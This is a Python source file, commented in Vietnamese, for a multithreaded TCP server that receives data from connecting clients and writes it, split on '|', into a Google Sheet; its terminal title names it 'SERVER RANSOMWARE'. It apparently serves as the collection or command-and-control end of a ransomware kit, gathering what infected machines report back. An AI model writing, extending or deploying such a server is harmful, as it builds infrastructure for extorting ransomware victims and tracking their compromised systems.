import sys
import os.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from time import sleep
from threading import Thread
from lib.modules import (
    setting,
    Terminal,
    SheetApis
)
from socket import (
    AF_INET, 
    SOCK_STREAM
)
import socket

bibliography: str = 'scripts'
name: str = 'setting'
idsheet: str = '10rs_CfL4W5uKJI-ueX1n1MVZF4DT8uzqyb7wgtp0zfo'

# Lớp Server để xử lý các kết nối và truyền dữ liệu
class Server:

    def __init__(self, host: str, port: int) -> None:
        self.host: str = host
        self.port: int = int(port)
        self.server = socket.socket(AF_INET, SOCK_STREAM)
        self.data_queue = []
        self.apis = SheetApis(idsheet)

    def HandleSheet(self) -> None:
        while True:
            try:
                if self.data_queue:
                    address, data = self.data_queue.pop(0)
                    if isinstance(data, bytes): 
                        data = data.decode()
                    self.apis.update_values([data.split('|')])  
                    Terminal.Console(self.host ,f"Processed data from {address}", 'Yellow')
                else:
                    sleep(5)
            except Exception as error:
                Terminal.Console('SHEETS', error, 'Red')

    # Xử lý dữ liệu từ mỗi client
    def HandleClient(self, client: socket, address) -> None:
        while True:
            try:
                data: bytes = client.recv(4096)
                if not data:
                    break
                if not isinstance(data, bytes): 
                    data = data.encode()
                self.data_queue.append([address[0], data])
                Terminal.Console(
                    address[0], 
                    f'Packet data: {round(len(data)/1024, 3)} KB',
                    'Yellow'
                )
            except Exception as error:
                Terminal.Console(address[0], error, 'Red')
                break
        client.close()
        Terminal.Console(
            address[0], 
            'Disconnect', 
            'Blue'
        )


    # Xử lý các kết nối đến server
    def HandleConnections(self) -> None:
        while True:
            client, address = self.server.accept()
            Terminal.Console(address[0], 'Connect to Server', 'Orange')
            thread = Thread(target=self.HandleClient, args=(client, address))
            thread.start()


    # Bắt đầu lắng nghe các kết nối đến server
    def Listening(self) -> None:
        try:
            self.server.bind((self.host, self.port))
            self.server.listen()
            Terminal.Console(f'{self.host}:{self.port}', 'The server starts listening', 'Green')
            thread = Thread(target=self.HandleConnections)
            thread.start()

            thread2 = Thread(target=self.HandleSheet)
            thread2.start()
        except socket.error:
            Terminal.Console(self.host, 'Address already in use', 'Red')
        except Exception as error:
            Terminal.Console(self.host, error, 'Red')
            select: str = Terminal.Input(
                'Re-enter Settings(Y/n)', 
                'Orange'
            )
            try:
                if select.lower() == 'y':
                    os.remove(f'{bibliography}/{name}.yml')
                    Terminal.Reset()
            except Exception as e:
                Terminal.Console(self.host, error, 'Red')
            main()


def main():
    try:
        data = setting(bibliography, name)
        Server(data[0], data[1]).Listening()

    except Exception as error:
        Terminal.Console(
            'SYSTEM', 
            error, 
            'Red'
        )
        select: str = Terminal.Input(
            'Re-enter Settings(Y/n)', 
            'Orange'
        )
        if select.lower() == 'y':
            os.remove(f'{bibliography}/{name}.yml')
        Terminal.Reset()


# Hàm main để khởi tạo server và bắt đầu lắng nghe các kết nối
if __name__ == '__main__':
    Terminal.Init()
    Terminal().Clear()
    Terminal().Title('SERVER RANSOMWARE')
    Terminal().Size(320, 240)
    main()